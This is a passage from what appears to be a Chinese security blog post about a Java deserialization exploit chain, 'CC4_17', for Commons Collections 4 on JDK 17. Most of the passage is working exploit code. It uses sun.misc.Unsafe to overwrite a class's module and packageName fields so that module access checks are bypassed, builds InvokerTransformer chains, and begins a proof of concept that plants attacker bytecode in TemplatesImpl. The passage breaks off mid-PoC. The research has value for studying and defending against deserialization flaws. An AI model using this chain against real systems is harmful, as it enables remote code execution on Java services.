+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">TrAXFilter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">ObjectModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getModule&#34;</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">TrAXFilter</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="o">=</span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;packageName&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(addr);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(Class.class.getModule().getClass());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(&#34;1111&#34;+TrAXFilter.getPackageName());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        unsafe.getAndSetObject(TrAXFilter,addr,&#34;javax.xml&#34;);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(Class.class.getDeclaredField(&#34;packageName&#34;));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(ObjectModule);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(ObjectModule.getClass().getName());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Class&lt;?&gt; TrAXFilter2 = Class.forName(&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(&#34;222&#34;+TrAXFilter2.getPackageName());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        final Class&lt;?&gt; cls = input.getClass();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        final Method method = cls.getMethod(iMethodName, iParamTypes);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        return (O) method.invoke(input, iArgs);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        InvokerTransformer invokerTransformer4 = new InvokerTransformer(&#34;getAndSetObject&#34;,new Class[]{Object.class,long.class,Object.class}, new Object[]{Class.forName(&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;),60,&#34;javax.xml&#34;});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;get&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;setAccessible&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">true</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TransformerClosure</span><span class="w"> </span><span class="n">transformerClosure</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformerClosure</span><span class="p">(</span><span class="n">invokerTransformer2</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClosureTransformer</span><span class="w"> </span><span class="n">ClosureTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ClosureTransformer</span><span class="p">(</span><span class="n">transformerClosure</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getDeclaredField&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">UnsafeClass</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">,</span><span class="n">ClosureTransformer</span><span class="p">,</span><span class="n">invokerTransformer3</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">keyTransformer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 从文件中反序列化对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">o1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Transformer</span><span class="p">)</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(Class.forName(&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;).getPackageName());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">transform</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">o1</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">transform</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(Class.forName(&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;).getPackageName());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">patchModule</span><span class="p">(</span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="n">Class</span><span class="w"> </span><span class="n">goalclass</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">ObjectModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getModule&#34;</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">goalclass</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">currentClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="o">=</span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;module&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">ObjectModule</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h3 id="22-module">2.2 Module<a hidden class="anchor" aria-hidden="true" href="#22-module">#</a></h3>
+<p>本以为最难的问题已经解决了，但是又用新的问题了wwww</p>
+<p>后面其实就只是调用<code>unsafe.getAndSetObject</code>，他的参数都可以传然后调用。正当我这么想的时候突然一阵不好的预感</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">ObjectModule</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p>这里<code>addr</code>是一个<code>long值</code>，可以直接传，但是<code>ObjectModule</code>是一个<code>Module类</code>啊，不能反序列化，而且也不能通过前面的<code>CC链transform</code>构造，因为你<code>构造出来也传不到参数的地方</code>吧！www，这截止比上一个更卡死，简直无解！</p>
+<h3 id="23-pn">2.3 pn<a hidden class="anchor" aria-hidden="true" href="#23-pn">#</a></h3>
+<p>没办法，只能抱着最后一丝希望去看看<code>newInstance</code>，是怎么进行<code>模块检测</code>的，看能不能通过其他方法绕过</p>
+<p>然后调试 调试 调试 啊 发现起初就是这个地方给我们return false的</p>
+<p><img loading="lazy" src="../images/image-20250110200405827.png" alt="image-20250110200405827"  />
+</p>
+<p>往下看，可以看到进行了<code>模块比较</code>，一样的话直接就会返回<code>true</code></p>
+<p><img loading="lazy" src="../images/image-20250110200548457.png" alt="image-20250110200548457"  />
+</p>
+<p>然后后面会进去到<code>Module</code>类，这里调用的是<code>被调用类（TrAXFilter）</code>的<code>Module.isExported</code></p>
+<p>然后跟到<code>implIsExportedOrOpen</code>，然后发现了这个<code>isNamed()</code>，这里代码意思是<code>被调用类没有模块名字</code>的话就直接返回<code>true</code></p>
+<p><img loading="lazy" src="../images/image-20250110201129028.png" alt="image-20250110201129028"  />
+</p>
+<p>那简单呀用Unsafe把<code>TrAXFilter</code>的<code>Module.name</code>改了不久行了，这个想法我起初也觉得快成了。但其实<code>Module</code>类做了防护，java不会让我们得到这个的类Field。<code>getDeclaredFields()</code>出来都是空的。</p>
+<p>然后还想过能不能直接把<code>Module</code>设置成<code>null</code>呀，<code>null</code>能反序列化呀，其实纯扯，在进入<code>isExported</code>方法时其实就会报空指针错误！</p>
+<p>然后第二个和第三个if都没希望的，<code>this==other</code>的话前面代码就返回true了，然后isOpen()是false</p>
+<p>那只有最后点希望咯，跟进<code>isStaticallyExportedOrOpen</code></p>
+<p><img loading="lazy" src="../images/image-20250110202538652.png" alt="image-20250110202538652"  />
+</p>
+<p>上面那个if<code>openPackages</code>是null，根本操作不了，然后看到下面这个if</p>
+<p>这个<code>exportedPackages</code>是一个Hashmap，会从这里面获取值，还记得这个pn是什么，是<code>被调用类的模块名(com.sun.org.apache.xalan.internal.xsltc.trax)</code>,正常这里是没有对应的key，返回null的。</p>
+<p>我们跟进<code>allows</code>，wc，发现<code>只要targets不为null</code>，怎么样都返回true啊啊啊啊（下图是我已经操作过的，targets会有值</p>
+<p><img loading="lazy" src="../images/image-20250110202936723.png" alt="image-20250110202936723"  />
+</p>
+<p>也就是<code>pn</code>只要是<code>exportedPackages</code>中的<code>任意一个key</code>值不就行了，我们再回想下pn怎么来的</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">pkg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">memberClass</span><span class="p">.</span><span class="na">getPackageName</span><span class="p">();</span><span class="c1">//pkg就是pn</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">return</span><span class="w"> </span><span class="n">memberModule</span><span class="p">.</span><span class="na">isExported</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span><span class="w"> </span><span class="n">currentModule</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Class</span><span class="p">.</span><span class="na">class中</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getPackageName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">pn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">packageName</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pn</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">pn</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>可以看到就是Class类中<code>packageName</code>属性，这还不容易？，Class类中<code>module</code>属性，我都能改，还改不你了？</p>
+<p>直接用Unsafe修改了<code>packageName</code></p>
+<h1 id="0x04-poc">0x04 poc<a hidden class="anchor" aria-hidden="true" href="#0x04-poc">#</a></h1>
+<p>心心念念的poc呜呜呜</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.misc.Unsafe</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC4_17</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">appClassLoader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassLoader</span><span class="p">.</span><span class="na">getSystemClassLoader</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">pool</span><span class="p">.</span><span class="na">insertClassPath</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">javassist</span><span class="p">.</span><span class="na">LoaderClassPath</span><span class="p">(</span><span class="n">appClassLoader</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;eval&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="c1">//这里随便一个类就行，code2凑数用的</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz2</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">code</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">patchModule</span><span class="p">(</span><span class="n">CC4_17</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">aClass</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">().</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">,</span><span class="n">code2</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_transletIndex&#34;</span><span class="p">,</span><span class="n">0</span><span class="p">);</span><span class="w">
